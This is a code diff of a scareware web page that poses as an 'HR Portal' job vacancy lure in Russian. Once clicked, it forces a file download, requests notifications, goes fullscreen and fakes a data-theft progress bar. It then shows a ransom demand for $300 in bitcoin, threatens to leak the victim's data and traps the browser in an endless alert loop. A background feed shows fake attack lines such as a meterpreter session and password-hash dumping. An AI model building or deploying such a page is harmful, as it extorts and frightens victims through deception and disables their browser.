@@ -7,65 +7,68 @@
     <style>
         body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
         
-        /* ТЕРМИНАЛЬНЫЙ ФОН */
-        #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 12px; opacity: 0.2; z-index: 1; pointer-events: none; white-space: pre-wrap; word-break: break-all; }
+        /* ХАКЕРСКИЙ ЛОГ НА ФОНЕ */
+        #terminal-log { position: fixed; top: 0; left: 0; width: 100%; height: 100%; font-size: 11px; opacity: 0.3; z-index: 1; pointer-events: none; padding: 10px; overflow: hidden; line-height: 1.2; }
 
-        /* НАЧАЛЬНЫЙ ЭКРАН (ВАКАНСИЯ) */
+        /* НАЧАЛЬНЫЙ ЭКРАН */
         #overlay { position: fixed; top:0; left:0; width:100%; height:100%; z-index: 9999; background: #f0f2f5; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .start-box { background: white; padding: 40px 30px; border-radius: 2px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; border-top: 5px solid #1a73e8; }
-        .start-btn { padding: 18px; font-size: 16px; background: #1a73e8; color: white; border: none; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 4px 6px rgba(26,115,232,0.2); }
+        .start-box { background: white; padding: 40px 30px; border-radius: 4px; box-shadow: 0 20px 60px rgba(0,0,0,0.1); width: 85%; max-width: 400px; text-align: center; border-top: 6px solid #1a73e8; }
+        .start-btn { padding: 18px; font-size: 16px; background: #1a73e8; color: white; border: none; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.2s; }
+        .start-btn:active { background: #1557b0; }
 
-        /* ИНТЕРФЕЙС ВЫМОГАТЕЛЯ */
+        /* ЭКРАН ВЫМОГАТЕЛЯ */
         .content { position: relative; z-index: 10; width: 95%; max-width: 600px; display: none; }
-        .ransom-window { background: #7b0000; color: white; border: 4px solid #ff0000; padding: 20px; box-shadow: 0 0 50px #000; text-align: left; }
-        .header-danger { background: #ff0000; color: white; padding: 10px; font-weight: bold; font-size: 20px; text-align: center; margin-bottom: 20px; }
+        .ransom-window { background: #7b0000; color: white; border: 4px solid #ff0000; padding: 20px; box-shadow: 0 0 50px #000; }
+        .header-danger { background: #ff0000; color: white; padding: 10px; font-weight: bold; font-size: 18px; text-align: center; margin-bottom: 20px; text-transform: uppercase; }
         
         /* ЛОУДЕР */
-        #loader-screen { position: relative; z-index: 10; width: 80%; text-align: left; font-size: 14px; }
-        .progress-container { width: 100%; border: 1px solid #0f0; height: 20px; margin: 15px 0; background: #000; position: relative; }
-        #progress-bar { width: 0%; height: 100%; background: #0f0; transition: width 0.3s; }
+        #loader-screen { position: relative; z-index: 10; width: 85%; text-align: left; font-size: 14px; }
+        .progress-container { width: 100%; border: 1px solid #0f0; height: 22px; margin: 15px 0; background: #000; }
+        #progress-bar { width: 0%; height: 100%; background: #0f0; }
         
         /* ДЕТАЛИ */
-        .btc-box { background: #000; border: 1px dashed #ffff00; padding: 10px; color: #ffff00; font-family: monospace; font-size: 12px; margin: 15px 0; word-break: break-all; }
-        .danger-btn { background: #000; color: #ff0000; border: 2px solid #ff0000; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .btc-box { background: #000; border: 1px dashed #ffff00; padding: 12px; color: #ffff00; font-family: monospace; font-size: 13px; margin: 15px 0; word-break: break-all; text-align: center; }
+        .danger-btn { background: #000; color: #ff0000; border: 2px solid #ff0000; padding: 16px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
         .blink { animation: blinker 0.8s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
-        .warning-text { color: #ff0000; font-weight: bold; text-decoration: underline; }
     </style>
 </head>
 <body onclick="startAttack()">
 
     <div id="overlay">
         <div class="start-box">
-            <h2 style="margin: 0 0 15px; color: #1e293b;">HR Portal</h2>
-            <p style="color: #475569; font-size: 14px;">Для входа в систему и просмотра деталей вакансии «Менеджер проектов», необходимо пройти верификацию безопасности устройства.</p>
-            <button class="start-btn">ПРОЙТИ ВЕРИФИКАЦИЮ</button>
+            <h2 style="margin: 0 0 15px; color: #1e293b; font-family: sans-serif;">HR Portal</h2>
+            <p style="color: #475569; font-size: 14px; font-family: sans-serif; line-height: 1.4;">Для просмотра вакансии «Менеджер проектов» и доступа к системе тестирования, подтвердите безопасность вашего устройства.</p>
+            <button class="start-btn">ПРОЙТИ ПРОВЕРКУ</button>
         </div>
     </div>
 
-    <div id="matrix"></div>
+    <div id="terminal-log"></div>
 
     <div id="loader-screen" style="display: none;">
-        <div id="log-text">Инициализация протокола проверки...</div>
+        <div id="log-text">Инициализация верификации...</div>
         <div class="progress-container"><div id="progress-bar"></div></div>
-        <div id="perc">0%</div>
+        <div style="display: flex; justify-content: space-between;">
+            <span id="perc">0%</span>
+            <span id="kb">0 KB / 842 MB</span>
+        </div>
     </div>
 
     <div id="main-content" class="content">
         <div class="ransom-window">
-            <div class="header-danger">Ooops, your important files are encrypted!</div>
-            <p style="font-size: 14px; line-height: 1.4;">Все данные вашего устройства (Telegram сессии, история браузера, личные фото и контакты) были успешно скопированы и зашифрованы алгоритмом AES-256.</p>
-            <p style="font-size: 14px; line-height: 1.4;"><span class="warning-text">ВНИМАНИЕ:</span> Попытка закрыть страницу или перезагрузить устройство приведет к немедленной публикации данных на публичных серверах.</p>
+            <div class="header-danger">All your files have been encrypted!</div>
+            <p style="font-size: 14px; line-height: 1.4;">Ваше устройство заблокировано. Личные фото, переписки Telegram и пароли выгружены на удаленный сервер <strong>82.202.160.11</strong>.</p>
+            <p style="font-size: 14px; line-height: 1.4; color: #ff9999;">Любая попытка закрыть окно или удалить RAT приведет к немедленной публикации данных в открытый доступ.</p>
             
-            <div style="margin: 15px 0; border-top: 1px solid #ff0000; padding-top: 10px;">
-                <p style="margin: 0; font-size: 13px;">Для расшифровки данных отправьте <b>$300</b> на BTC адрес:</p>
+            <div style="margin: 15px 0; border-top: 1px dashed #ff0000; padding-top: 10px;">
+                <p style="margin: 0; font-size: 13px; text-align: center;">Для расшифровки переведите <b>$300</b> на BTC:</p>
                 <div class="btc-box">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
             </div>
 
-            <p class="blink" style="text-align: center; color: #ffff00; font-weight: bold;">STATUS: WAITING FOR PAYMENT (167:59:58)</p>
+            <p class="blink" style="text-align: center; color: #ffff00; font-weight: bold; font-size: 16px;">ОЖИДАНИЕ ОПЛАТЫ: 167:59:42</p>
             
             <button class="danger-btn" onclick="scareMore()">ДЕАКТИВИРОВАТЬ И УДАЛИТЬ RAT</button>
-            <p style="font-size: 10px; text-align: center; margin-top: 10px; opacity: 0.7;">Hardware ID: 0x822-CRITICAL-ERR</p>
+            <p style="font-size: 10px; text-align: center; margin-top: 15px; opacity: 0.6;">System ID: REDMI-9-RAT-ACTIVE</p>
         </div>
     </div>
 
@@ -75,6 +78,23 @@
         let prg = 0;
         let isStarted = false;
 
+        // Реальные "хакерские" команды для фона
+        const terminalCommands = [
+            "GET /api/v1/auth/token HTTP/1.1",
+            "Exploit: java/meterpreter/reverse_tcp",
+            "Sending stage (175174 bytes) to 192.168.1.12",
+            "Meterpreter session 1 opened",
+            "Searching for sensitive files: *.jpg, *.png, *.docx",
+            "Found 1,422 media files. Starting exfiltration...",
+            "Accessing Telegram Desktop Database...",
+            "Keyloger: hook_keyboard_init(SUCCESS)",
+            "Capturing screenshot... Saved to /tmp/sc_01.png",
+            "Privilege Escalation: sudo su - (GRANTED)",
+            "Dumping password hashes from /etc/shadow...",
+            "Encrypting sector 0x8821... [OK]",
+            "Connection established with C2 server 82.202.160.11"
+        ];
+
         function startAttack() {
             if (isStarted) return;
             isStarted = true;
@@ -82,81 +102,72 @@
             document.getElementById('overlay').style.display = 'none';
             document.getElementById('loader-screen').style.display = 'block';
 
-            // Запрос уведомлений
-            if ("Notification" in window) {
-                Notification.requestPermission();
-            }
-
-            // Автоскачивание файла (под видом лога верификации)
-            const blob = new Blob(["CRITICAL_SYSTEM_ERROR_DUMP_0x112"], {type: 'text/plain'});
+            // Имитация скачивания и пушей
+            if ("Notification" in window) Notification.requestPermission();
             const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = "verification_report_log.txt";
+            a.href = URL.createObjectURL(new Blob(["RAT_DATA"]), {type: 'text/plain'});
+            a.download = "security_patch_v9.txt";
             a.click();
 
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(() => {});
-            }
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
 
             slowLoading();
-            startMatrix();
+            runTerminal();
         }
 
         function slowLoading() {
             const steps = [
-                "Подключение к серверу HR...",
-                "Проверка системных разрешений...",
-                "Анализ кэша приложений...",
-                "Чтение данных Telegram Desktop...",
-                "Копирование медиа-файлов (DCIM)...",
-                "Загрузка базы данных Chrome...",
-                "Шифрование пользовательских папок...",
-                "Завершение процесса..."
+                "Подключение к HR Cloud...",
+                "Верификация токена...",
+                "Проверка Android API...",
+                "Синхронизация данных...",
+                "Копирование медиа...",
+                "Шифрование...",
+                "Финальный отчет..."
             ];
             const bar = document.getElementById('progress-bar');
             const log = document.getElementById('log-text');
             const perc = document.getElementById('perc');
+            const kb = document.getElementById('kb');
 
-            // Специально замедленная загрузка (около 12-15 секунд)
             const timer = setInterval(() => {
-                prg += Math.random() * 1.5;
+                prg += Math.random() * 0.8;
                 if (prg > 100) prg = 100;
                 
                 bar.style.width = prg + "%";
                 perc.innerText = Math.floor(prg) + "%";
-                log.innerText = steps[Math.floor(prg / 13)] || "Подготовка отчета...";
+                kb.innerText = Math.floor(prg * 8.4) + " MB / 842 MB";
+                log.innerText = steps[Math.floor(prg / 15)] || "Завершение...";
 
                 if (prg >= 100) {
                     clearInterval(timer);
-                    setTimeout(showRansom, 1000); // Пауза перед "ударом"
+                    setTimeout(showRansom, 1500);
                 }
-            }, 150);
+            }, 200); // Около 25 секунд на всю процедуру
+        }
+
+        function runTerminal() {
+            const term = document.getElementById('terminal-log');
+            setInterval(() => {
+                const cmd = terminalCommands[Math.floor(Math.random() * terminalCommands.length)];
+                term.innerHTML += `[${new Date().toLocaleTimeString()}] ${cmd}<br>`;
+                if (term.innerHTML.length > 2000) term.innerHTML = term.innerHTML.substring(500);
+                window.scrollTo(0, document.body.scrollHeight);
+            }, 400);
         }
 
         function showRansom() {
             document.getElementById('loader-screen').style.display = 'none';
             document.getElementById('main-content').style.display = 'block';
-            document.body.style.backgroundColor = "#220000"; // Меняем фон на темно-красный
-            
+            document.body.style.backgroundColor = "#1a0000";
             document.getElementById('siren').play().catch(() => {});
-            if(navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
-        }
-
-        function startMatrix() {
-            const matrix = document.getElementById('matrix');
-            setInterval(() => {
-                matrix.innerHTML += Math.random() > 0.5 ? "0" : "1";
-                if(matrix.innerHTML.length > 3000) matrix.innerHTML = matrix.innerHTML.substring(500);
-            }, 20);
+            if(navigator.vibrate) navigator.vibrate([500, 200, 500, 200, 1000]);
         }
 
         function scareMore() {
-            alert("ACCESS DENIED: Система заблокирована. Попытка взлома зафиксирована сервером.");
+            alert("FATAL ERROR: RAT process cannot be terminated. Encryption is 84% complete.");
             setTimeout(() => {
-                while(true) {
-                    alert("YOUR DATA IS BEING UPLOADED TO PUBLIC DOMAIN");
-                    alert("CLOSE ATTEMPT FAILED");
-                }
+                while(true) { alert("DATA_LEAK_IN_PROGRESS: " + Math.random().toString(36).substring(7)); }
             }, 500);
         }
 
